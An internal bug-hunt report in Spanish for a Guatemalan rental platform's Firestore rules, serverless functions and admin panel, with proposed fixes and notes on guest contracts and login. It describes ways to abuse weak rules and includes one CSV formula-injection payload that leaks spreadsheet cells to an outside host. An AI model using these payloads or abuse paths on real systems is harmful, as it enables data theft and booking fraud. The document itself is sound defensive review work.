# Hallazgos del 19 nov 2026

Cacería de errores en el código real (2 agentes, solo lectura) y 4.ª simulación (contrato con el huésped y acceso del cliente). Nada de esto está arreglado todavía; se arregla por tandas, con pruebas y segunda revisión donde toca dinero, datos de clientes o reglas.

## A. Reservas, chat y reglas

Hallazgos de la revisión (solo lectura, sin cambios ni commits). Van de mayor a menor gravedad.

1. **Alta. El chat del cliente no tiene que coincidir con su solicitud: el socio confirma una cosa y el servidor guarda otra.**
   - Dónde: `firestore.rules:533-568` (crear `chats/{token}`).
   - Qué pasa: la regla solo compara con el lead `codigo`, `propertyId`, `createdAt` y `subtotal`, y `subtotal` es opcional. No compara `llegada`, `salida`, `noches`, `total` ni `moneda`.
   - Ejemplo: alguien crea un lead válido para 20–27 dic con un subtotal alto (cuadra con su total). Por REST crea el chat con 3–4 feb, total bajo y sin subtotal.
   - El socio ve en Solicitudes (`solicitudes.js:181-186`, la solicitud se arma desde el chat) 1 noche y una comisión chica, y confirma.
   - El servidor (`reservas.mjs:54-58`) reserva las fechas del lead (20–27 dic) con `alojamiento = max(cotizado del lead, precios de hoy)`. Resultado: la comisión queda inflada y se bloquean fechas que el socio nunca vio.
   - Arreglo: en la regla de crear el chat, exigir que `llegada`, `salida`, `noches`, `total`, `moneda` y `subtotal` (obligatorio) sean iguales a los de `leads/{leadId}.reserva`.

2. **Alta. La moneda de la reserva y de la comisión la pone el cliente, no la casa.**
   - Dónde: `admin/js/reservas-calculo.js:64` y `:114` (`moneda: r.moneda || 'USD'`), y `firestore.rules:443-450`, que no valida `reserva.moneda`.
   - Ejemplo: lead de una casa en USD con `moneda: 'GTQ'`. Al confirmar, `costoSocio` y `comision.monto` salen de los precios en USD pero quedan marcados como GTQ. EQ cobra «Q 300» en vez de US$ 300 (unas 7.7 veces menos).
   - Arreglo: en `reservaDeSolicitud` y `nuevaReserva` tomar `casa.moneda`, y en la regla exigir `reserva.moneda == properties/{id}.moneda`.

3. **Media. Se puede confirmar una solicitud cuyas fechas ya pasaron, y la comisión nace vencida.**
   - Dónde: `netlify/functions/reservas.mjs:47-62` (y el camino del administrador en `admin/js/reservas.js:222`). No revisan `llegada >= hoy`. El botón «Confirmar» se muestra igual (`solicitudes.js:331`).
   - Ejemplo: solicitud del 21–23 nov que queda abierta porque el socio chatea (o porque es anterior a `PLAZOS_DESDE`). El socio confirma el 26 nov.
     - `comision.vence = 2026-11-21`, así que `nivelComision` da 3 de inmediato.
     - `disponibilidad` pone la casa en pausa y la siguiente publicación la saca del sitio.
     - `vencePago` es Infinity: nunca se cancela sola.
   - Contradicción: la campana ya la trata como «vieja» (`avisos.js:96`).
   - Arreglo: rechazar con 409 (y ocultar el botón) cuando `!antesDeLlegar(lead.reserva.llegada)`, o cuando `llegada < V.hoy()` si se quiere permitir confirmar el mismo día.

4. **Media. La página del cliente dice «venció sin respuesta» aunque la solicitud siga abierta y el socio todavía la pueda confirmar.**
   - Dónde: `js/reserva-chat.js:142`. Pone «Vencida» a las 24 h siempre.
   - Por qué falla: `plazos-reservas.mjs:172-177` no cierra la solicitud si el socio escribió en las últimas 12 h, ni si es anterior a `PLAZOS_DESDE`.
   - Resultado: el cliente lee «Esta solicitud venció… elige otras fechas», reserva en otro lado, y después recibe la confirmación con plazo de pago de 48 h.
   - Arreglo: mostrar «Vencida» solo cuando `c.estado === 'no'` (lo escribe el servidor). Mientras siga pendiente, mostrar «Tarde».

5. **Media. Una solicitud que el socio mantiene viva chateando puede quedar pendiente para siempre.**
   - Dónde: `plazos-reservas.mjs:227`. Solo revisa leads de los últimos 7 días.
   - Ejemplo: el socio escribe por última vez en el día 6.9. A las 12 h sin mensajes ya pasó el día 7, el lead sale de la consulta y nunca se cierra.
   - Resultado: queda «Sin responder» en el panel y en la campana, y se puede confirmar tarde (enlaza con el punto 3).
   - Arreglo: consultar por `createdAt` desde `PLAZOS_DESDE`, o filtrar por `solicitud.estado` en lugar de por la ventana de 7 días.

6. **Media-baja. El cliente puede marcar «comprobante enviado» en cualquier estado del chat, y con eso apaga la cancelación sola y la del socio.**
   - Dónde: `firestore.rules:572-578`. No pide `estado == 'confirmada'`; la foto puede ser cualquier imagen subida a la carpeta del chat.
   - Ejemplo: por REST, con el chat pendiente, el cliente sube una imagen y pone `comprobanteCliente`. Al confirmarse la reserva:
     - `cobrarOCancelar` la salta (`plazos-reservas.mjs:192`);
     - `motivoParaNoCancelar` le prohíbe cancelar al socio;
     - las fechas quedan tomadas hasta que intervenga el administrador.
   - Arreglo: en la regla, exigir `resource.data.get('estado','') == 'confirmada'` para poner `comprobanteCliente`.

7. **Baja. `/api/aviso-chat` vuelve a mandar el mismo correo cada vez que alguien lo llama.**
   - Dónde: `netlify/functions/aviso-chat.mjs:24-26` y `netlify/lib/avisos-chat.mjs:146-160` y `:162`. No guarda qué aviso ya salió y el límite es en memoria (20 por chat cada 10 min, por instancia).
   - Ejemplo: quien tenga el token repite POST durante 10 minutos. El socio, el equipo y el cliente reciben 20 o más veces «Nueva solicitud»; después de confirmar, se repite «Reserva confirmada: cómo pagar».
   - Arreglo: anotar en el chat el último aviso enviado (el id del mensaje o «nueva») con la cuenta de escritura y no repetirlo.

8. **Baja. Cualquiera puede apartar las fechas de una casa sin límite.**
   - Dónde: `netlify/functions/disponibilidad.mjs:236-237`. Toda solicitud de menos de 2 h bloquea esas fechas, y crear leads es público sin límite (`firestore.rules:459`).
   - Ejemplo: un script crea una solicitud cada 2 h para Semana Santa y el calendario la muestra ocupada para todos.
   - Arreglo: apartar solo las solicitudes que ya tienen chat registrado en `chatsPorSolicitud` y limitar por IP o por casa. Como mínimo, no apartar más de N por casa.

9. **Baja. Una cancelación vieja vuelve a salir en el correo de cada hora.**
   - Dónde: `netlify/functions/solicitudes-sin-respuesta.mjs:42` y `:46`. Toma toda solicitud o reserva cancelada que se haya actualizado dentro de la ventana.
   - Ejemplo: días después, el administrador corrige montos en Rentas (`guardarReserva` cambia `updatedAt` en la reserva y en el lead). La reserva aparece otra vez en «Reservas canceladas».
   - Arreglo: anotar `alertas/cancelada-{id}` como ya se hace con `bloqueo-{id}`, o filtrar por la fecha del último renglón «Canceló» del historial.

Lo revisé y quedó bien: las fórmulas de `calc-vacacional` (redondeo `r2`, noches con la salida sin contar, «hoy» en UTC−6, `vencePago` a las 23:00 de la víspera), las transacciones del servidor (`ALREADY_EXISTS` responde 409), que el precio del socio y el público vayan siempre juntos, la privacidad (el socio no lee los leads) y el horario de `solicitudes-sin-respuesta` (7–21 h de Guatemala).

Los puntos 1, 2 y 6 tocan dinero y reglas: según `CLAUDE.md` llevan segunda revisión y `npm run test:reglas`. Las pruebas de reglas (`scripts/emulador/test-reglas.mjs`) hoy no cubren ninguno de los tres casos.

## B. Sitio público, publicación y panel

Busqué errores solo leyendo el código; no cambié archivos. `npm test` pasa. Comprobé con node sobre los módulos puros los casos 2, 3, 4, 5 y 13 (y el 14 en `partirTelefono`). Los demás los seguí línea por línea en el código; no los probé corriendo el panel ni el sitio. Van de más grave a menos grave.

1. **Un lead se pierde cuando la casa cambió de asesor y el sitio no se ha vuelto a publicar** (alta)
   - Archivos: `firestore.rules:487-490` y `js/site.js:314-317`.
   - Escenario: se cambia el asesor de una casa en su ficha o con «Asignar asesor» en lote (`admin/js/views/properties.js:622`), o la casa pasa de venta a renta por noche. Mientras no se publique, la página sigue mandando el `data-agent-id` viejo. La regla exige que sea igual al `agentId` actual, así que rechaza el pedido; el sitio solo reintenta cuando falla por `propietarioId`. El cliente ve «no se pudo enviar» y el lead nunca se guarda.
   - Es el mismo tipo de error que `docs/revision-antes-de-unir.md:82` y `:105`: una regla que exige un dato que una página ya publicada manda distinto.
   - Arreglo: que la regla acepte también `agentId == ''` y que `site.js` reintente con `agentId ''` cuando trae `propertyId` (el lead le llega al administrador).

2. **Dos casas con la zona escrita distinto se pisan la misma página de zona** (alta, SEO)
   - Archivos: `scripts/lib/landings.mjs:69,73` y `admin/js/views/properties.js:1246` (al guardar no se recorta ni se normaliza `zona`).
   - Escenario: cuatro casas con «Zona 10» y una con «zona 10» o «Zona 10 ». Salen tres entradas del plan con la misma dirección `/propiedades/zona-10/`; lo comprobé con `planListados`. Gana la última que se escribe, que tiene 1 casa y va `noindex`, y por eso la página sale del sitemap. Las otras 4 casas desaparecen de su página de zona y el filtro de zona del listado muestra opciones repetidas.
   - Arreglo: agrupar las zonas por `slugZona(nombre)` (en vez del texto exacto) y guardar `zona` recortada.

3. **El importador lee «Q.5,000» como 5 y «Q.350,000» como 350, sin dar error** (alta, dinero)
   - Archivo: `admin/js/importar.js:155`.
   - Escenario: un precio escrito «Q.350,000», muy común en Guatemala. El código quita la «Q» pero deja el punto («.350,000»), y lo toma como decimal. Resultados: «Q.5,000» → 5, «Q.2500» → 0.25. «Q. 1,250,000» sí da error, pero las otras formas pasan en silencio.
   - Arreglo: después de limpiar, quitar los signos de puntuación del inicio: `s = s.replace(/^[.,]+/, '')`.

4. **«Ocultar precio» de una casa VIP no oculta el precio en tarjetas, metadescripción ni compartir** (media-alta)
   - Archivo: `scripts/lib/templates.mjs:472` (`propertyCard` → `price(p)`).
   - También en `:450` (`data-precio`), `:1184` (`shareButtons`), `:1179` (`data-view-content`) y `:1717` (sin subtítulo cae en `seoDescription` → `price`).
   - Escenario: casa VIP con «Ocultar precio». En el listado, la portada y «parecidas» la tarjeta dice «US$ 1,250,000.00» (comprobado con `propertyCard`). Su metadescripción en Google también lo lleva.
   - Arreglo: una sola función `precioVisible(p)` que devuelva «Precio a consultar» y 0 cuando `vipLanding.ocultarPrecio`, usada en todos esos lugares.

5. **El formulario público le corta el código de país a números que empiezan igual** (media)
   - Archivo: `js/site.js:229`.
   - Escenario: un cliente elige +39 y escribe un celular italiano «392 123 4567». Se guarda «+39 21234567», que no existe y pasa la validación. Igual con +55 y el código de área 55 de Brasil: «+55 912345678».
   - Arreglo: quitar el código solo si lo que queda tiene el largo nacional de ese país, o si el número venía con «00» o «+».

6. **«Traducir al inglés» en la ficha borra los cambios sin guardar** (media, pérdida de datos)
   - Archivo: `admin/js/views/properties.js:1408-1416`.
   - Escenario: se edita la descripción en español sin guardar y se toca ⋮ → «Traducir al inglés». Se traduce el texto sin guardar, se escribe solo `en` y `recargar()` vuelve a leer la base: el español editado se pierde y el inglés queda de un texto que ya no existe.
   - Arreglo: llamar a `save()` antes de traducir, o pedir confirmación cuando el formulario difiere de `alAbrir`.

7. **El inglés queda viejo cuando cambian las amenidades o los textos VIP** (media, datos falsos en /en/)
   - Archivos: `admin/js/views/properties.js:79` (`fuenteEs` solo mira título, descripción y textos de renta por noche) y `scripts/build.mjs:134`.
   - Escenario: se quita «Piscina» en español y se guarda. `faltaIngles` da falso, no se vuelve a traducir, y la ficha en inglés sigue diciendo «Pool» porque prefiere `en.amenidades`. Lo mismo pasa con titular, subtítulo y puntos clave VIP.
   - Arreglo: incluir `amenidades` y los campos de `vipLanding` en `fuenteEs`.

8. **«Cambiar estado» de una sola fila no revisa `incoherencia`** (media; es un error que ya pasó)
   - Archivo: `admin/js/views/properties.js:482-483`.
   - Escenario: en una casa por noche, ⋮ → «Cambiar estado» ofrece «Vendida», «Reservada» y «Rentada», y las guarda. El sitio muestra la etiqueta y el JSON-LD con ese estado. Es el mismo error de `docs/revision-antes-de-unir.md:123`, que se arregló en el lote y en la importación pero no en el menú de la fila.
   - Arreglo: ofrecer `estadosPara(p.operacion)` en vez de `ESTADOS`.

9. **Si se corrige a mano el título en inglés, la dirección inglesa anterior da 404** (media, SEO)
   - Archivos: `admin/js/views/properties.js:1264` (solo guarda la dirección anterior en español) y `scripts/build.mjs:485`.
   - Escenario: se cambia `en.titulo` de «Pool house» a «House with pool» y se guarda. La dirección `/en/property/pool-house/` cae en `/en/* → 404`, porque `en.slugsAnteriores` solo se llena en `traducirEn`.
   - Arreglo: al guardar, si cambió el slug de `en.titulo`, agregar el anterior a `d.en.slugsAnteriores`.

10. **Inyección de fórmulas al exportar los leads a CSV** (media, seguridad)
    - Archivos: `admin/js/ui.js:229` y `admin/js/views/leads.js:154`.
    - Escenario: alguien envía el formulario del sitio con el nombre `=HYPERLINK("https://x/?d="&B2,"Ver")`. Las reglas lo aceptan. Al exportar los leads y abrir el archivo en Excel, la celda se ejecuta como fórmula y puede sacar datos de otras celdas.
    - Arreglo: en `downloadCsv`, anteponer `'` a toda celda que empiece con `= + - @`, tabulador o retorno de carro.

11. **El WhatsApp de Contenido y el de los asesores no tienen formato ni validación** (media-baja)
    - Archivos: `admin/js/views/content.js:206-207` y `admin/js/views/agents.js:24`, ambos `type: 'tel'`.
    - Escenario: el WhatsApp de un asesor en EE. UU. escrito «305 555 1234» queda como `wa.me/3055551234` (se lee como Grecia), y todos sus botones del sitio fallan. Ninguna validación lo frena, contra la regla de un solo formato de `CLAUDE.md`.
    - Arreglo: usar `type: 'telefono'` (código de país + `telefonoValido`) en los dos.

12. **Los enlaces anteriores en inglés pueden llevar a la casa equivocada** (baja)
    - Archivo: `scripts/build.mjs:484-490`.
    - Escenario: dos casas con el mismo título en inglés. `main()` le pone a la segunda el sufijo del id (`:551-554`), pero `redirects()` vuelve a llamar `propiedadEn(p)` sin ese sufijo. Las direcciones anteriores en inglés de la segunda casa redirigen a la ficha de la primera.
    - Arreglo: pasar a `redirects` el mapa id → slug en inglés ya resuelto en `main()`.

13. **El horario en JSON-LD inventa el sábado con frases comunes** (baja, SEO)
    - Archivos: `admin/js/formato.js:116` y `scripts/build.mjs:600`.
    - Escenario: el horario escrito como «De lunes a viernes, 9:00 a 18:00», «Lunes a viernes: 8:00 a 17:00 y sábados 8:00 a 12:00» o «…, sábados 8:00 a 12:00» da `null`. Entonces el JSON-LD usa el horario por defecto, lunes a sábado de 9:00 a 18:00, y le dice a Google que abren sábados en horario completo.
    - Arreglo: aceptar «de/desde» al inicio y «, » o « y » entre tramos además de «;».

14. **«+(502) 5555-1234» se parte mal en el panel** (baja)
    - Archivo: `admin/js/formato.js:164`.
    - Escenario: un lead del sitio guarda «+(502) 5555-1234» (pasa `telefonoValido` como teléfono genérico). Al abrir la ficha del cliente, el campo muestra +502 y «2) 5555-1234». Al guardar queda «+502 2) 5555-1234», con 12 dígitos, y la validación no deja guardar.
    - Arreglo: cortar el código por dígitos, no por caracteres: `numero: t.replace(/^\+\D*\d{len}/, '').trim()`.

Descarté por ser algo ya decidido o sin una falla concreta:
- **Horario por defecto:** que el JSON-LD use lunes a sábado de 9:00 a 18:00 cuando no entiende el texto está documentado como decisión del dueño. Lo que reporto en el 13 es solo que no entiende frases comunes.
- **Pies cuadrados:** `conPiesCuadrados("2.500 m²")` da 27 sq ft, pero solo pasaría con texto en inglés que use punto de miles.
- **Publicación automática:** al abrir el panel después de un fallo, reintenta y quita `fallo`; es menor.
- **Escape de HTML:** `templates.mjs`, el panel (`h()`) y el correo del lead escapan bien.

## C. 4.ª simulación: contrato con el huésped y acceso del cliente

- **c-firma, c-detalle (huésped que paga otra persona):** Ana firma con sus datos, pero si paga su hermano el comprobante llega con otro nombre. En s-pago el socio duda o toca «No me llegó». → En «Ya pagué», agregar el campo opcional «¿Pagó otra persona? Nombre», y que s-pago lo muestre junto a «Es lo que debía pagarte».
- **c-firma (huésped extranjero):** un solo campo, «DPI o pasaporte», sin tipo de documento ni país y sin una regla para validarlo (el DPI tiene 13 dígitos; el pasaporte lleva letras). → Un selector DPI/Pasaporte, con el país si es pasaporte, y cada uno con su validación, igual que el teléfono en `formato.js`.
- **c-firma en inglés:** el contrato y las cláusulas que el socio escribe en español le llegan a un huésped de EE. UU. que no puede leerlo, y así firmarlo vale poco. → El PDF en dos idiomas, con una línea «Prevalece el texto en español», y la cláusula del socio con su traducción automática marcada como tal.
- **c-firma (cancelación):** en el ejemplo, la estadía empieza el dom 22 y ya pasó el plazo de «gratis hasta 7 días antes». Ana firma una regla que ya no le sirve sin enterarse. → Calcular la regla para esta reserva: «Esta reserva ya no tiene cancelación gratis».
- **c-firma y c-lista (plazo):** firmar le quita tiempo al plazo de pago, pero c-firma no muestra la hora límite. Además, en c-lista y en la franja sigue diciendo «Falta tu pago». → Título «Firma y paga antes del sáb 21 nov, 12:42»; en c-lista, la píldora «Falta firmar» mientras no haya firmado.
- **s-pago (datos del cliente):** el PDF de «Firmó el contrato · PDF» lleva el nombre completo y el número de DPI o pasaporte. El número de documento no le hace falta al socio y se presta a usos indebidos. → En la copia del socio, el número oculto (···0101); el documento completo solo lo ven el equipo y el huésped. Esto toca datos de clientes, así que lleva una segunda revisión.
- **c-detalle (huésped deshonesto):** al firmar, el huésped ve «A nombre de Rodrigo Méndez» y la cuenta; con eso puede buscar al socio, pagarle directo y dejar vencer la reserva. El contrato no lo impide. → Nueva señal en a-fuga: «Firmó y no subió comprobante; las fechas se ocuparon o se bloquearon después». Además, el correo de «¿Al final te hospedaste?» también para las reservas que se liberaron solas después de firmar.
- **s-chuesped (cláusulas del socio):** el texto libre puede servir para desviar al cliente («depósito en efectivo al llegar», «descuento pagando directo»). Dice «Equipo Inmobiliario las revisa», pero ninguna pantalla del equipo lo hace. → Cada cláusula nueva o cambiada queda «Por revisar», no sale en el contrato hasta que el equipo la aprueba y aparece en a-nuevo «Cambios de socios». También pasa por el filtro del chat.
- **s-chuesped (versión):** si el socio cambia cláusulas o enciende el contrato con reservas en curso, no se sabe qué firmó cada huésped. → Cada firma guarda la versión y la huella (hash) del PDF, y el cambio aplica solo a solicitudes nuevas. Decirlo en una línea junto al interruptor.
- **Plan §4–5 (dos documentos para lo mismo):** «Condiciones de tu reserva», aceptadas al pedir, y «Contrato de la casa», firmado al pagar, repiten las reglas. Además, c-detalle reemplaza un PDF por el otro sin regla clara. → Un solo documento: las condiciones son el contrato; al pedir se aceptan y en Pago se firman con nombre y documento. Si el socio no pide contrato, queda solo la aceptación. Actualizar el plan, que todavía no menciona el contrato con el huésped.
- **Contrato del socio y del huésped (dos piezas para firmar):** el socio firma con el dedo en s-contrato y el huésped escribe su nombre en c-firma. → Una sola pieza de firma: nombre como en el documento, «Leí y acepto», y se guardan fecha, IP, dispositivo y hash. Es la del huésped, más fácil en celular y con el mismo valor bajo el Decreto 47-2008; la del socio se adapta a ella.
- **a-contratos (admin):** solo lista los contratos de los socios. Ante un reclamo, el equipo no encuentra el contrato firmado por el huésped. → En la reserva, del lado del admin, «Contrato del huésped (PDF)» con su registro de firma.
- **c-correo (Google):** si Ana reservó con ana@outlook.com y entra con Google (ana@gmail.com), ve una lista vacía, sin salida. Además, el aviso «Si ese correo tiene reservas…» quedó debajo de Google, lejos de su campo. → Si no hay reservas con ese correo, mostrar «No hay reservas con ana@gmail.com · Usar otro correo». Subir el aviso para que quede pegado al campo del correo, con Google debajo.
- **c-correo y c-lista (enlaces):** el enlace del correo da acceso a la cuenta bancaria, al DPI y a la dirección; si alguien reenvía el correo, otra persona entra. → Que el enlace venza (por ejemplo, en 24 h) y sirva solo para entrar en ese dispositivo, sin ser una URL permanente de la reserva. Esto también lleva una segunda revisión.

**Acceso del cliente.** Recomiendo dejar las tres vías: que el celular recuerde las reservas, el enlace por correo con vencimiento como camino principal y Google como atajo. Cubren a guatemaltecos y estadounidenses en celular sin contraseña y sin costo por envío.
El enlace solo se pierde. La contraseña es la vía más difícil de usar y la menos segura para alguien que reserva pocas veces. El código por WhatsApp es cómodo en Guatemala, pero cuesta por cada envío, exige la API de WhatsApp Business y lo usan menos los viajeros de EE. UU.
Agregaría «Continuar con Apple» solo si los datos muestran muchos iPhone de EE. UU. Lo que no se puede dejar fuera es el estado vacío de Google y el vencimiento de los enlaces.
